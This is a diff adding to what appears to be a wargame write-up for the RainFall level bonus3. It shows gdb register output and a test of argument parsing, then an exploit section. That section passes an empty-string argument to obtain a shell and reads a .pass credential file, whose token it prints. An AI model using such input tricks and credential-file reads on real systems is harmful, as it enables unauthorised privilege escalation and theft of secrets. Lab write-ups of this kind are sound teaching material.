@@ -66,3 +66,46 @@ int main(){
 
 There is a seg fault so I don't understand something
 
+```sh
+Breakpoint 2, 0x080485df in main ()
+(gdb) info registers
+eax            0xffffffff       -1
+ecx            0x30     48
+edx            0xbffff6a8       -1073744216
+ebx            0xbffff6a8       -1073744216
+esp            0xbffff690       0xbffff690
+ebp            0xbffff738       0xbffff738
+esi            0x0      0
+edi            0xbffff72c       -1073744084
+eip            0x80485df        0x80485df <main+235>
+eflags         0x200297 [ CF PF AF SF IF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+```
+
+has we can see it's interpreted has 48 '0' ascii
+
+so if we give that to our test test2.c :
+
+```sh
+hiro@WIN-6D4JHE0NA8F:~/Rainfall/bonus3/Ressources(main⚡) » ./a.out "" | cat -e
+ac : 2$
+ac[1] = $
+```
+
+Yes !
+
+## Exploit
+
+```sh
+bonus3@RainFall:~$ ./bonus3 ""
+$
+$ cat /home/user/end/.pass
+3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
+$
+```
+
